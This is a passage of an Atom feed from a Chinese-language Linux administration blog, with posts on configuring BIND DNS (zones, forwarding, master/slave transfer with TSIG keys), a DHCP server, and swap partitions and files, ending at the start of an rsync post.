&#x6DFB;&#x52A0;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;vim /var/named/192.168.73.arpa$TTL 3H@   IN SOA  abc.cn. root.abc.cn. (                    0   ; serial                    1D  ; refresh                    1H  ; retry                    1W  ; expire                    3H )    ; minimum    NS  ns.abc.cn.ns  A   192.168.73.55   PTR ns.abc.cn.5   PTR www.abc.cn.</code></pre><h3 id="&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;"><a href="#&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;" class="headerlink" title="&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;"></a>&#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;</h3><pre><code class="vim">vim /etc/named.conf################options{    forward first;    # &#x591A;&#x4E2A;DNS&#x7528;;&#x9694;&#x5F00;    forwarders {        192.168.73.2;        114.114.114.114;        8.8.8.8;        8.8.4.4;        1.1.1.1;    };}</code></pre><h2 id="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;"><a href="#&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;" class="headerlink" title="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;"></a>&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1;</h2><blockquote><p>&#x4E3B;&#x4ECE;&#x673A;&#x5668;&#x8FDB;&#x884C;&#x65F6;&#x95F4;&#x540C;&#x6B65;</p></blockquote><pre><code class="bash">ntpd</code></pre><p><strong>&#x4FEE;&#x6539;&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</strong></p><pre><code class="vim">vim /etc/named.conf###################zone &quot;abc.cn&quot; IN {    type master;    file &quot;abc.cn.zone&quot;;    allow-transfer { 192.168.73/24; };  # &#x6DFB;&#x52A0;&#x8BE5;&#x53C2;&#x6570;};zone &quot;73.168.192.in-addr.arpa&quot; IN {    type master;    file &quot;192.168.73.arpa&quot;;    allow-transfer { 192.168.73/24; };  # &#x6DFB;&#x52A0;&#x8BE5;&#x53C2;&#x6570;};```vim**&#x4FEE;&#x6539;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;**```inivim /etc/named.confoptions{    listen-on port 53 { any; };    listen-on-v6 port 53 { any; };    ...    allow-query     { any; };    recursion yes;    ...    ...    dnssec-validation no;}zone &quot;abc.cn&quot; IN {    type slave;    file &quot;slaves/abc.cn.zone.file&quot;;    masters { 192.168.73.5; };};zone &quot;73.168.192.in-addr.arpa&quot; IN {    type slave;    file &quot;slaves/192.168.73.arpa.file&quot;;    masters { 192.168.73.5; };};</code></pre><blockquote><p>&#x91CD;&#x542F;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#xFF0C;<br>&#x67E5;&#x770B;/var/named/slaves/&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br>&#x4ECE;DNS&#x670D;&#x52A1;&#x80FD;&#x591F;&#x4ECE;&#x4E3B;DNS&#x590D;&#x5236;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8FC7;&#x6765;</p></blockquote><h3 id="DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;"><a href="#DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;" class="headerlink" title="DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;"></a>DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;</h3><blockquote><p>ntpd&#x4E3B;&#x4ECE;&#x65F6;&#x95F4;&#x540C;&#x6B65;</p></blockquote><p><strong>&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</strong></p><pre><code class="bash"># &#x751F;&#x6210;&#x5BC6;&#x94A5;cd /var/named/chroot/etc/dnssec-keygen -a hmac-md5 -b 128 -n HOST &#x5BC6;&#x94A5;&#x540D;&#x79F0;# &#x67E5;&#x770B;&#x5BC6;&#x94A5;&#x7684;&#x5BC6;&#x7801;cat k****.+**+***.keycat Kdnskey.+157+23495.keydnskey. IN KEY 512 3 157 Rg0mKvMMQ06YAoN0FcOCXQ==&#x590D;&#x5236;&#x5BC6;&#x7801;&#x4E32;######################################### &#x4FEE;&#x6539;&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;vim /etc/named.conf# &#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;key &quot;dnskey&quot; {    algorithm hmac-md5;    secret &quot;&#x7C98;&#x8D34;&#x751F;&#x6210;&#x7684;key&#x5BC6;&#x7801;&#x4E32;&quot;;};zone &quot;abc.cn&quot; IN {    type master;    file &quot;abc.cn.zone&quot;;    allow-transfer { key &#x5BC6;&#x94A5;&#x540D;&#x79F0; };};zone &quot;73.168.192.in-addr.arpa&quot; IN {    type master;    file &quot;192.168.73.apra&quot;;    allow-transfer { key &#x5BC6;&#x94A5;&#x540D;&#x79F0; };};</code></pre><p><strong>&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</strong></p><pre><code class="bash"># &#x4FEE;&#x6539;dns&#x914D;&#x7F6E;&#x6587;&#x4EF6;vim /etc/named.conf# &#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;key &quot;dnskey&quot; {    algorithm hmac-md5;    secret &quot;&#x7C98;&#x8D34;&#x751F;&#x6210;&#x7684;&#x5BC6;&#x94A5;&#x5230;&#x8BE5;&#x5904;&quot;;};zone &quot;abc.cn&quot; IN {    type slave;    file &quot;slaves/abc.cn.zone.file&quot;;    masters { 192.168.73.5 key dnskey; };};zone &quot;73.168.192.in-addr.arpa&quot; IN {    type slave;    file &quot;slaves/192.168.73.arpa.file&quot;;    masters { 192.168.73.5 key dnskey; };};</code></pre><h2 id="&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;"><a href="#&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;" class="headerlink" title="&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;"></a>&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;</h2><p><strong>&#x542F;&#x52A8;&#x72B6;&#x6001;&#x62A5;network unreachable&#x95EE;&#x9898;</strong></p><pre><code>Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;./DNSKEY/IN&apos;: 2001:503:ba3e::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;./NS/IN&apos;: 2001:503:ba3e::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:500:48::1#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:4f8:0:2::19#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:2f::f#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:500:2f::f#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:1::803f:235#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:500:1::803f:235#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:503:c27::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:503:c27::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:1a::1#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:4f8:0:2::20#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:500:60::29#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns1.isc.ultradns.net/A/IN&apos;: 2001:7fd::1#53</code></pre><blockquote><p>&#x914D;&#x7F6E;&#x9012;&#x5F52;&#x65F6;&#xFF0C;&#x8F6C;&#x53D1;&#x6570;&#x636E;&#x4F18;&#x5148;IPv6&#x8FED;&#x4EE3;</p></blockquote><p>&#x4FEE;&#x6539;<code>/etc/sysconfig/named</code></p><pre><code># &#x6DFB;&#x52A0;OPTIONS#/etc/sysconfig/named &#x662F;bind&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x65F6;&#x4F20;&#x9012;&#x53C2;&#x6570;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;OPTIONS=&quot;-4&quot;# BIND named process options# ~~~~~~~~~~~~~~~~~~~~~~~~~~</code></pre><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.cnblogs.com/zy09/p/14596993.html" target="_blank" rel="noopener">https://www.cnblogs.com/zy09/p/14596993.html</a></p><p><strong>&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x65E0;&#x6CD5;&#x8BFB;&#x53D6;&#x4ECE;DNS&#x914D;&#x7F6E;</strong></p><blockquote><p>&#x4FEE;&#x6539;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><pre><code class="bash">vim /etc/named.confdnssec-enable yes;  dnssec-validation no;   #&#x5173;&#x95ED;&#x9A8C;&#x8BC1;</code></pre></blockquote><h2 id="DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;"><a href="#DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;" class="headerlink" title="DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;"></a>DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;</h2><blockquote><p>An example of a simple resource record (RR):<br>example.com.    86400    IN    A    192.0.2.1</p></blockquote><p>example.com, &#x8D44;&#x6E90;&#x8BB0;&#x5F55;<br>86400,  time to live(TTL)<br>IN  &#x201C;the Internet system&#x201D;, &#x6307;&#x660E;RR&#x7684;&#x7684;&#x7C7B;&#x522B;<br>A   &#x6307;&#x660E;RR&#x7684;&#x7C7B;&#x578B;&#xFF0C;a host address<br>192.0.2.1   &#x6307;&#x660E;RR&#x5305;&#x542B;&#x7684;IP&#x5730;&#x5740;</p><blockquote><p>/etc/named.conf&#xFF0C;bind&#x7684;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br>/var/named/&#xFF0C;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x8F85;&#x52A9;&#x76EE;&#x5F55;</p></blockquote><p>SOA &#xFF0C;Start of Authority Record&#xFF0C;&#x8D77;&#x59CB;&#x6388;&#x6743;&#x8BB0;&#x5F55;&#xFF0C;&#x6BCF;&#x4E2A;&#x533A;&#x5728;&#x533A;&#x7684;&#x5F00;&#x59CB;&#x90FD;&#x5305;&#x542B;&#x4E00;&#x4E2A;<br>NS&#xFF0C;Name Server&#xFF0C;&#x57DF;&#x540D;&#x670D;&#x52A1;&#x5668;&#x8BB0;&#x5F55;&#xFF0C;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x8BE5;&#x57DF;&#x540D;&#x7531;&#x54EA;&#x4E2A;DNS&#x670D;&#x52A1;&#x5668;&#x6765;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x6BCF;&#x4E2A;&#x533A;&#x81F3;&#x5C11;&#x5305;&#x542B;&#x4E00;&#x4E2A;NS<br>A&#xFF0C;&#x5730;&#x5740;&#x8D44;&#x6E90;&#x8BB0;&#x5F55;&#xFF0C;&#x628A;FQDN&#xFF08;&#x5B8C;&#x5168;&#x5408;&#x683C;&#x57DF;&#x540D;&#xFF0C;&#x6216;&#x5B8C;&#x6574;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#xFF09;&#x6620;&#x5C04;&#x5230;IP&#x5730;&#x5740;&#xFF0C;&#x8BE5;&#x8BB0;&#x5F55;&#x80FD;&#x591F;&#x89E3;&#x6790;FQDN&#x57DF;&#x540D;&#x5BF9;&#x5E94;&#x7684;IP&#x5730;&#x5740;&#x3002;<br>PTR&#xFF0C;&#x6307;&#x9488;&#x8BB0;&#x5F55;&#xFF0C;&#x628A;IP&#x5730;&#x5740;&#x6620;&#x5C04;&#x5230;FQDN&#xFF0C;&#x7528;&#x4E8E;&#x53CD;&#x5411;&#x67E5;&#x8BE2;&#xFF0C;&#x901A;&#x8FC7;IP&#x5730;&#x5740;&#x627E;&#x5230;&#x57DF;&#x540D;&#x3002;<br>CNAME&#xFF0C;&#x522B;&#x540D;&#x8BB0;&#x5F55;&#xFF0C;&#x521B;&#x5EFA;&#x7279;&#x5B9A;&#x7684;FQDN&#x522B;&#x540D;<br>MX&#xFF0C;&#x90AE;&#x4EF6;&#x4EA4;&#x6362;&#x8BB0;&#x5F55;&#xFF0C;&#x6307;&#x5B9A;&#x90AE;&#x4EF6;&#x4EA4;&#x6362;&#x670D;&#x52A1;&#x5668;&#x3002;</p><p><strong>/etc/named.conf&#x5E38;&#x7528;&#x914D;&#x7F6E;&#x9009;&#x9879;</strong></p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>allow-query</td><td></td></tr><tr><td>allow-query-cache</td><td></td></tr><tr><td>blackhole</td><td></td></tr><tr><td>directory</td><td></td></tr><tr><td>disable-empty-zone</td><td></td></tr><tr><td>dnssec-enable</td><td></td></tr><tr><td>dnssec-validation</td><td></td></tr><tr><td>empty-zones-enable</td><td></td></tr><tr><td>forwarders</td><td></td></tr><tr><td>forward</td><td></td></tr><tr><td>listen-on</td><td></td></tr><tr><td>listen-on-v6</td><td></td></tr><tr><td>max-cache-size</td><td></td></tr><tr><td>notify</td><td></td></tr><tr><td>pid-file</td><td></td></tr><tr><td>recursion</td><td></td></tr><tr><td>statistics-file</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x914D;&amp;#x7F6E;&amp;#x5B9E;&amp;#x73B0;&quot;&gt;&lt;a href=&quot;#&amp;#x914D;&amp;#x7F6E;&amp;#x5B9E;&amp;#x73B0;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x914D;&amp;#x7F6E;&amp;#x5B9E;&amp;#x7
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DHCP Server的配置与管理</title>
    <link href="https://marnm.github.io//posts/9964b559/"/>
    <id>https://marnm.github.io//posts/9964b559/</id>
    <published>2022-06-07T04:34:55.000Z</published>
    <updated>2022-06-07T05:25:31.173Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x5B89;&#x88C5;&#x914D;&#x7F6E;"><a href="#&#x5B89;&#x88C5;&#x914D;&#x7F6E;" class="headerlink" title="&#x5B89;&#x88C5;&#x914D;&#x7F6E;"></a>&#x5B89;&#x88C5;&#x914D;&#x7F6E;</h2><pre><code class="bash">#rhel/centosyum install -y dhcp</code></pre><blockquote><p><code>/etc/dhcp/dhcpd.conf</code>DHCP&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x76EE;&#x5F55;<br><code>/usr/share/doc/dhcp*/dhcpd.conf.sample</code>DHCP&#x914D;&#x7F6E;&#x6A21;&#x677F;<br><code>/var/lib/dhcpd/dhcpd.leases</code> dhcp&#x79DF;&#x7EA6;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4FDD;&#x5B58;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x79DF;&#x7EA6;&#x58F0;&#x660E;&#xFF0C;&#x5305;&#x542B;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x3001;MAC&#x5730;&#x5740;&#x3001;&#x5206;&#x914D;&#x7684;IP&#x5730;&#x5740;&#x7B49;&#x3002;</p></blockquote><h3 id="&#x914D;&#x7F6E;&#x793A;&#x4F8B;"><a href="#&#x914D;&#x7F6E;&#x793A;&#x4F8B;" class="headerlink" title="&#x914D;&#x7F6E;&#x793A;&#x4F8B;"></a>&#x914D;&#x7F6E;&#x793A;&#x4F8B;</h3><pre><code class="bash">vim /etc/dhcp/dhcpd.conf######################### &#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x6BB5;&#xFF1A;subnet 192.168.1.0 netmask 255.255.255.0 {  # &#x5730;&#x5740;&#x6C60;IP&#x5730;&#x5740;&#x8303;&#x56F4;  range 192.168.1.10 192.168.1.50;  # &#x5BA2;&#x6237;&#x7AEF;&#x6307;&#x5B9A;DNS&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#xFF1A;  #option domain-name-servers ns1.internal.example.org;   # &#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x6307;&#x5B9A;&#x6240;&#x5C5E;&#x7684;&#x57DF;&#xFF1A;  #option domain-name &quot;internal.example.org&quot;;  # &#x9ED8;&#x8BA4;&#x7F51;&#x5173;/&#x8DEF;&#x7531;  option routers 192.168.1.1;  # &#x5E7F;&#x64AD;&#x5730;&#x5740;  option broadcast-address 192.168.1.255;  # &#x5B9A;&#x4E49;IP&#x9ED8;&#x8BA4;&#x79DF;&#x7EA6;&#x65F6;&#x95F4;&#xFF0C;&#xFF08;&#x5355;&#x4F4D;&#xFF1A;s/&#x79D2;&#xFF09;&#xFF1A;  default-lease-time 600;    # &#x5B9A;&#x4E49;IP&#x6700;&#x5927;&#x79DF;&#x7EA6;&#x65F6;&#x957F;&#xFF0C;&#xFF08;&#x5355;&#x4F4D;&#xFF1A;s/&#x79D2;&#xFF09;&#xFF1A;  max-lease-time 7200;  # &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x7C7B;&#x578B;  log-facility local7;  # IP&#x5730;&#x5740;&#x7ED1;&#x5B9A;&#xFF1A;  # &#x6307;&#x5B9A;&#x4E00;&#x4E2A;IP&#x5730;&#x5740;&#x7ED9;&#x6307;&#x5B9A;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x5740;&#x4E0D;&#x53EF;&#x4EE5;&#x4E0D;&#x5728;&#x5730;&#x5740;&#x6C60;&#x8303;&#x56F4;&#x5185;  host localhost {    # &#x5BA2;&#x6237;&#x7AEF;&#x7684;MAC&#x5730;&#x5740;    hardware ethernet 00:0c:29:10:d9:56;    # &#x6307;&#x5B9A;&#x7684;IP&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;    fixed-address 192.168.1.11;  }}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x5B89;&amp;#x88C5;&amp;#x914D;&amp;#x7F6E;&quot;&gt;&lt;a href=&quot;#&amp;#x5B89;&amp;#x88C5;&amp;#x914D;&amp;#x7F6E;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x5B89;&amp;#x88C5;&amp;#x914D;&amp;#x7
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>根分区扩容</title>
    <link href="https://marnm.github.io//posts/f0a65eeb/"/>
    <id>https://marnm.github.io//posts/f0a65eeb/</id>
    <published>2022-06-07T04:33:22.000Z</published>
    <updated>2022-06-07T04:56:53.702Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>swap交换分区</title>
    <link href="https://marnm.github.io//posts/37ca92de/"/>
    <id>https://marnm.github.io//posts/37ca92de/</id>
    <published>2022-06-07T04:32:42.000Z</published>
    <updated>2022-06-07T05:25:46.405Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;"><a href="#&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;" class="headerlink" title="&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;"></a>&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;</h3><p><strong>&#x65B9;&#x6CD5;&#x4E00;&#xFF1A;&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x5206;&#x533A;</strong></p><blockquote><p>&#x4F7F;&#x7528;fdisk/gdisk&#x7B49;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;<br>&#x4F7F;&#x7528;mkswap&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x5206;&#x533A;</p></blockquote><pre><code class="bash">fdisk /dev/sdbn...+1G...w# &#x8BBE;&#x7F6E;&#x4EA4;&#x6362;&#x5206;&#x533A;mkswap /dev/sdb1# &#x542F;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;swapon /dev/sdb1# &#x5F00;&#x673A;&#x6302;&#x8F7D;vim /etc/fstab#&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;/dev/sdb1   swap swap   defaults 0 0</code></pre><p><strong>&#x65B9;&#x6CD5;&#x4E8C;&#xFF1A;&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x6587;&#x4EF6;</strong></p><pre><code class="bash"># &#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;512MB&#x5927;&#x5C0F;&#x7684;&#x6587;&#x4EF6;&#x4E3A;&#x4F8B;&#xFF1A;dd if=/dev/zero of=/swapfile bs=1024 count=524288# &#x521B;&#x5EFA;swap&#x683C;&#x5F0F;&#x6587;&#x4EF6;mkswap /swapfile# &#x542F;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;swapon /swapfile# &#x5F00;&#x673A;&#x6302;&#x8F7D;vim /etc/fstab/swapfile   swap    swap    defaults 0 0</code></pre><h3 id="&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;"><a href="#&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;" class="headerlink" title="&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;"></a>&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;</h3><pre><code class="bash"># &#x7981;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;/&#x4EA4;&#x6362;&#x6587;&#x4EF6;swapoff /dev/sdb1#swapoff /swapfile</code></pre><p>&#x4ECE;<code>/etc/fstab</code>&#x5220;&#x9664;swap&#x9879;&#x76EE;&#xFF0C;&#x4F7F;&#x7528;fdisk&#x6216;yast&#x5DE5;&#x5177;&#x5220;&#x9664;&#x5206;&#x533A;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x6269;&amp;#x5C55;&amp;#x4EA4;&amp;#x6362;&amp;#x5206;&amp;#x533A;&quot;&gt;&lt;a href=&quot;#&amp;#x6269;&amp;#x5C55;&amp;#x4EA4;&amp;#x6362;&amp;#x5206;&amp;#x533A;&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx访问控制</title>
    <link href="https://marnm.github.io//posts/d4e5e907/"/>
    <id>https://marnm.github.io//posts/d4e5e907/</id>
    <published>2022-06-03T04:38:08.000Z</published>
    <updated>2022-06-07T03:15:25.890Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx日志管理</title>
    <link href="https://marnm.github.io//posts/2793eb31/"/>
    <id>https://marnm.github.io//posts/2793eb31/</id>
    <published>2022-06-02T02:29:20.000Z</published>
    <updated>2022-06-02T02:32:13.270Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>rsync数据同步</title>
    <link href="https://marnm.github.io//posts/3c7a2415/"/>
    <id>https://marnm.github.io//posts/3c7a2415/</id>
    <published>2022-05-03T14:16:38.000Z</published>
    <updated>2022-05-03T14:17:03.557Z</updated>
    
    <content type="html"><![CDATA[<h2 id="rsync&#x57FA;&#x7840;"><a href="#rsync&#x57FA;&#x7840;" class="headerlink" title="rsync&#x57FA;&#x7840;"></a>rsync&#x57FA;&#x7840;</h2><p><strong>rsync&#x547D;&#x4EE4;</strong> &#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;LAN/WAN&#x5FEB;&#x901F;&#x540C;&#x6B65;&#x591A;&#x53F0;&#x4E3B;&#x673A;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x3002;rsync&#x4F7F;&#x7528;&#x6240;&#x8C13;&#x7684;&#x201C;rsync&#x7B97;&#x6CD5;&#x201D;&#x6765;&#x4F7F;&#x672C;&#x5730;&#x548C;&#x8FDC;&#x7A0B;&#x4E24;&#x4E2A;&#x4E3B;&#x673A;&#x4E4B;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x8FBE;&#x5230;&#x540C;&#x6B65;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x53EA;&#x4F20;&#x9001;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4E0D;&#x540C;&#x90E8;&#x5206;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x6574;&#x4EFD;&#x4F20;&#x9001;&#xFF0C;&#x56E0;&#x6B64;&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#x3002; rsync&#x662F;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x975E;&#x5E38;&#x5F3A;&#x5927;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x547D;&#x4EE4;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x8272;&#x9009;&#x9879;&#xFF0C;&#x6211;&#x4EEC;&#x4E0B;&#x9762;&#x5C31;&#x5BF9;&#x5B83;&#x7684;&#x9009;&#x9879;&#x4E00;&#x4E00;&#x8FDB;&#x884C;&#x5206;&#x6790;&#x8BF4;&#x660E;&#x3002;</p><a id="more"></a><h3 id="&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;"><a href="#&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;" class="headerlink" 